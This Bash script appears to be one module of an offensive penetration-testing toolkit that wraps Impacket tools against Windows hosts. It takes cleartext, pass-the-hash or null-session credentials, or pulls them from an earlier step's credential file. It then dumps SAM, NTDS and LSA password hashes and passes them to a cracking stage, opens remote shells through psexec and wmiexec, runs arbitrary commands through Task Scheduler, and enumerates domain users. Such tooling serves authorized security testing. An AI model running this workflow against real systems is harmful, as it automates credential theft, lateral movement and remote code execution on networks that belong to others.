#!/usr/bin/env bash
source "$(dirname "$0")/../lib.sh"
set -uo pipefail

banner "IMPACKET SUITE" "secretsdump · psexec · wmiexec · smbclient · samrdump · atexec"

# ── Dependency detection ────────────────────────────────────────────────────────
section "DEPENDENCIES"

_imp_bin() {
  if   command -v "impacket-${1}" &>/dev/null; then printf 'impacket-%s' "$1"
  elif command -v "${1}.py"        &>/dev/null; then printf '%s.py'       "$1"
  else printf ''; fi
}

_SEC=$(_imp_bin secretsdump)
_PSX=$(_imp_bin psexec)
_WMI=$(_imp_bin wmiexec)
_SMB=$(_imp_bin smbclient)
_SAM=$(_imp_bin samrdump)
_ATX=$(_imp_bin atexec)

_any_found=0
_show() {
  local name="$1" path="$2"
  if [[ -n "$path" ]]; then
    printf '  %s[✓]%s %-14s %s%s%s\n' "${GREEN}" "${RESET}" "$name" "${DIM}" "$path" "${RESET}"
    _any_found=1
  else
    printf '  %s[~]%s %-14s not found\n' "${YELLOW}" "${RESET}" "$name"
  fi
}
_show "secretsdump" "$_SEC"
_show "psexec"      "$_PSX"
_show "wmiexec"     "$_WMI"
_show "smbclient"   "$_SMB"
_show "samrdump"    "$_SAM"
_show "atexec"      "$_ATX"
printf '\n'

if (( _any_found == 0 )); then
  printf '  %s[!]%s No impacket tools in PATH\n' "${RED}" "${RESET}"
  printf '      Install: %sapt install python3-impacket impacket-scripts%s\n' "${CYAN}" "${RESET}"
  exit 1
fi

# ── Target ─────────────────────────────────────────────────────────────────────
section "TARGET"

_DOMAIN="."; _USER=""; _PASS=""; _HASH=""

if [[ -n "${SESSION_DIR:-}" ]]; then
  # Pipeline auto-mode: use TARGET (first IP if CIDR), read creds from chain_creds.txt
  _host="${TARGET%%/*}"
  printf '  %s[CHAIN]%s Target: %s%s%s  (from pipeline TARGET)\n' \
    "${CYAN}" "${RESET}" "${GREEN}" "$_host" "${RESET}"

  # Parse first usable credential from chain_creds.txt
  # Format: [port][proto] host: X   login: Y   password: Z
  if [[ -s "${SESSION_DIR}/chain_creds.txt" ]]; then
    _cred_line=$(grep -m1 'login:.*password:' "${SESSION_DIR}/chain_creds.txt" 2>/dev/null || true)
    if [[ -n "$_cred_line" ]]; then
      _USER=$(echo "$_cred_line" | grep -oP 'login:\s*\K\S+' || true)
      _PASS=$(echo "$_cred_line" | grep -oP 'password:\s*\K\S+' || true)
      printf '  %s[CHAIN]%s Credentials from chain_creds.txt: %s/%s%s\n\n' \
        "${CYAN}" "${RESET}" "$_USER" "***" "${RESET}"
    else
      printf '  %s[CHAIN]%s No usable creds in chain_creds.txt — using null session%s\n\n' \
        "${DIM}" "${RESET}" "${RESET}"
      _USER="guest"
    fi
  else
    printf '  %s[CHAIN]%s No chain_creds.txt — using null session%s\n\n' \
      "${DIM}" "${RESET}" "${RESET}"
    _USER="guest"
  fi
  _auth=1
else
  printf '  %s>>%s Target host / IP: ' "${CYAN}" "${RESET}"
  read -r _host; _host="${_host:-}"
  [[ -z "$_host" ]] && { printf '  %s[!]%s No target specified\n' "${RED}" "${RESET}"; exit 1; }

  # ── Credentials ──────────────────────────────────────────────────────────────
  section "CREDENTIALS"
  printf '  %s[01]%s User:Password    %s(cleartext)%s\n'    "${CYAN}" "${RESET}" "${DIM}" "${RESET}"
  printf '  %s[02]%s User:Hash        %s(pass-the-hash)%s\n' "${CYAN}" "${RESET}" "${DIM}" "${RESET}"
  printf '  %s[03]%s Null / anonymous %s(no credentials)%s\n' "${CYAN}" "${RESET}" "${DIM}" "${RESET}"
  printf '\n  %s>>%s Auth mode [1]: ' "${CYAN}" "${RESET}"
  read -r _auth; _auth="${_auth:-1}"

  case "$_auth" in
    2)
      printf '  %s>>%s Domain [.]: ' "${CYAN}" "${RESET}"; read -r _tmp; _DOMAIN="${_tmp:-.}"
      printf '  %s>>%s Username: '   "${CYAN}" "${RESET}"; read -r _USER
      printf '  %s>>%s NTLM hash (LM:NT or :NT): ' "${CYAN}" "${RESET}"; read -r _HASH
      [[ "$_HASH" != *:* ]] && _HASH=":${_HASH}"
      ;;
    3)
      _USER="guest"; _PASS=""; _DOMAIN="."
      ;;
    *)
      printf '  %s>>%s Domain [.]: ' "${CYAN}" "${RESET}"; read -r _tmp; _DOMAIN="${_tmp:-.}"
      printf '  %s>>%s Username: '   "${CYAN}" "${RESET}"; read -r _USER
      set +H
      printf '  %s>>%s Password: '   "${CYAN}" "${RESET}"; read -r _PASS
      set -H 2>/dev/null || true
      ;;
  esac
fi

# Build the target string used by all impacket tools
_tgt() {
  case "$_auth" in
    2) printf '%s/%s@%s' "$_DOMAIN" "$_USER" "$_host" ;;
    3) printf '%s/@%s'  "$_DOMAIN" "$_host" ;;
    *) printf '%s/%s:%s@%s' "$_DOMAIN" "$_USER" "$_PASS" "$_host" ;;
  esac
}

# Build auth flags (prepended to command)
_auth_flags() {
  case "$_auth" in
    2) printf -- '-hashes %s' "$_HASH" ;;
    3) printf -- '-no-pass' ;;
    *) printf '';;
  esac
}

outdir="$(make_outdir)"
outfile="$outdir/impacket.log"
: > "$outfile"

_cleanup() { mark_done "$outdir"; }
trap '_cleanup' EXIT

printf '\n'
printf '  %s[SYS]%s Host : %s%s%s\n'   "${CYAN}" "${RESET}" "${GREEN}" "$_host"  "${RESET}"
case "$_auth" in
  2) printf '  %s[SYS]%s Auth : %sPTH  %s@%s%s\n' "${CYAN}" "${RESET}" "${CYAN}" "$_USER" "$_DOMAIN" "${RESET}" ;;
  3) printf '  %s[SYS]%s Auth : %snull session%s\n' "${CYAN}" "${RESET}" "${DIM}" "${RESET}" ;;
  *) printf '  %s[SYS]%s Auth : %s%s@%s%s\n' "${CYAN}" "${RESET}" "${CYAN}" "$_USER" "$_DOMAIN" "${RESET}" ;;
esac
printf '  %s[SYS]%s Log  : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$outfile" "${RESET}"

# ── Action menu ────────────────────────────────────────────────────────────────
section "ACTION MENU"

printf '  %s[01]%s secretsdump  — dump SAM · NTDS · LSA hashes\n'        "${CYAN}" "${RESET}"
printf '  %s[02]%s psexec       — interactive shell via SMB named pipe\n' "${CYAN}" "${RESET}"
printf '  %s[03]%s wmiexec      — semi-interactive shell via WMI\n'       "${CYAN}" "${RESET}"
printf '  %s[04]%s smbclient    — browse and download SMB shares\n'       "${CYAN}" "${RESET}"
printf '  %s[05]%s samrdump     — enumerate domain users via SAMR\n'      "${CYAN}" "${RESET}"
printf '  %s[06]%s atexec       — command execution via Task Scheduler\n'  "${CYAN}" "${RESET}"
printf '  %s[07]%s All recon    — secretsdump + samrdump (non-interactive)\n' "${CYAN}" "${RESET}"
if [[ -n "${SESSION_DIR:-}" ]]; then
  _action=7  # All recon: secretsdump + samrdump — non-interactive pipeline mode
  printf '  %s[CHAIN]%s Action: All recon (secretsdump + samrdump)  (pipeline auto-select)%s\n\n' \
    "${CYAN}" "${RESET}" "${RESET}"
else
  printf '\n  %s>>%s Select [1]: ' "${CYAN}" "${RESET}"
  read -r _action; _action="${_action:-1}"
fi

# ── Runners ─────────────────────────────────────────────────────────────────────

_run_secretsdump() {
  [[ -z "$_SEC" ]] && { printf '  %s[!]%s secretsdump not available\n' "${RED}" "${RESET}"; return; }
  section "SECRETSDUMP"
  local _hashfile="$outdir/hashes.txt"
  local _tstr; _tstr=$(_tgt)
  local _flags; _flags=$(_auth_flags)
  # shellcheck disable=SC2086
  { [[ -n "$_flags" ]] && "$_SEC" $_flags "$_tstr" || "$_SEC" "$_tstr"; } \
    2>&1 | tee -a "$outfile" "$_hashfile" || true
  local _hc; _hc=$(grep -cE '::' "$_hashfile" 2>/dev/null || echo 0)
  printf '\n  %s[SYS]%s %d hash line(s) → %s%s%s\n' \
    "${CYAN}" "${RESET}" "$_hc" "${DIM}" "$_hashfile" "${RESET}"
  # Pipeline chain: publish hashes for hashcrack.sh
  if [[ -n "${SESSION_DIR:-}" ]] && [[ -s "$_hashfile" ]]; then
    cat "$_hashfile" >> "${SESSION_DIR}/chain_hashes.txt" 2>/dev/null || true
    sort -u "${SESSION_DIR}/chain_hashes.txt" -o "${SESSION_DIR}/chain_hashes.txt" 2>/dev/null || true
    printf '  %s[CHAIN]%s chain_hashes.txt updated (%d hashes available to hashcrack)%s\n' \
      "${CYAN}" "${RESET}" "$(wc -l < "${SESSION_DIR}/chain_hashes.txt" 2>/dev/null || echo 0)" "${RESET}"
  fi
}

_run_psexec() {
  [[ -z "$_PSX" ]] && { printf '  %s[!]%s psexec not available\n' "${RED}" "${RESET}"; return; }
  section "PSEXEC — REMOTE SHELL"
  local _tstr; _tstr=$(_tgt)
  local _flags; _flags=$(_auth_flags)
  # shellcheck disable=SC2086
  { [[ -n "$_flags" ]] && run_fg "$_PSX" $_flags "$_tstr" || run_fg "$_PSX" "$_tstr"; } \
    2>&1 | tee -a "$outfile" || true
}

_run_wmiexec() {
  [[ -z "$_WMI" ]] && { printf '  %s[!]%s wmiexec not available\n' "${RED}" "${RESET}"; return; }
  section "WMIEXEC — WMI SHELL"
  local _tstr; _tstr=$(_tgt)
  local _flags; _flags=$(_auth_flags)
  # shellcheck disable=SC2086
  { [[ -n "$_flags" ]] && run_fg "$_WMI" $_flags "$_tstr" || run_fg "$_WMI" "$_tstr"; } \
    2>&1 | tee -a "$outfile" || true
}

_run_smbclient() {
  [[ -z "$_SMB" ]] && { printf '  %s[!]%s smbclient.py not available\n' "${RED}" "${RESET}"; return; }
  section "SMBCLIENT — SHARE BROWSER"
  local _tstr; _tstr=$(_tgt)
  local _flags; _flags=$(_auth_flags)
  # shellcheck disable=SC2086
  { [[ -n "$_flags" ]] && run_fg "$_SMB" $_flags "$_tstr" || run_fg "$_SMB" "$_tstr"; } \
    2>&1 | tee -a "$outfile" || true
}

_run_samrdump() {
  [[ -z "$_SAM" ]] && { printf '  %s[!]%s samrdump not available\n' "${RED}" "${RESET}"; return; }
  section "SAMRDUMP — DOMAIN USER ENUM"
  local _tstr; _tstr=$(_tgt)
  local _flags; _flags=$(_auth_flags)
  # shellcheck disable=SC2086
  { [[ -n "$_flags" ]] && "$_SAM" $_flags "$_tstr" || "$_SAM" "$_tstr"; } \
    2>&1 | tee -a "$outfile" || true
}

_run_atexec() {
  [[ -z "$_ATX" ]] && { printf '  %s[!]%s atexec not available\n' "${RED}" "${RESET}"; return; }
  section "ATEXEC — TASK SCHEDULER EXEC"
  printf '  %s>>%s Command to run on target [whoami]: ' "${CYAN}" "${RESET}"
  read -r _cmd; _cmd="${_cmd:-whoami}"
  local _tstr; _tstr=$(_tgt)
  local _flags; _flags=$(_auth_flags)
  # shellcheck disable=SC2086
  { [[ -n "$_flags" ]] && "$_ATX" $_flags "$_tstr" "$_cmd" || "$_ATX" "$_tstr" "$_cmd"; } \
    2>&1 | tee -a "$outfile" || true
}

case "$_action" in
  1) _run_secretsdump ;;
  2) _run_psexec ;;
  3) _run_wmiexec ;;
  4) _run_smbclient ;;
  5) _run_samrdump ;;
  6) _run_atexec ;;
  7) _run_secretsdump; _run_samrdump ;;
  *) printf '  %s[!]%s Invalid selection\n' "${RED}" "${RESET}" ;;
esac

printf '\n  %s[SYS]%s Log : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$outfile" "${RESET}"
